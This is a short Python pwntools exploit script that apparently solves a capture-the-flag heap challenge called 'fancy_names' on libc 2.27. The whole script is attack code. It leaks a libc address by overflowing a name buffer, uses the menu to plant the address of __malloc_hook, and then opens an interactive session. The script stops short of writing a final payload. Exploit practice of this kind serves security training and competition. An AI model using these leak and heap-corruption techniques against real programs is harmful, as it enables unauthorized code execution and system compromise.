#!/usr/bin/env python3

from pwn import *

exe = ELF("./fancy_names_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe
p = process()
def name1(data):
    p.sendlineafter(b'> ',b'1')
    p.sendafter(b'Insert new name (minimum 5 chars): ',data)
def name2(choice):
    p.sendlineafter(b'> ',b'2')
    p.sendlineafter(b'> ',f'{choice}'.encode())


name1(b'a'*56)
p.recvuntil(b'a'*56)
libc.address = u64(p.recv(6).ljust(8,b'\x00')) - 0x64e14 
log.info(f'libc: {hex(libc.address)}')

p.sendlineafter(b'(y/n): ',b'n')

input()
name2(2)
name1(p64(libc.sym.__malloc_hook))
p.sendlineafter(b'(y/n): ',b'y')
p.interactive()    
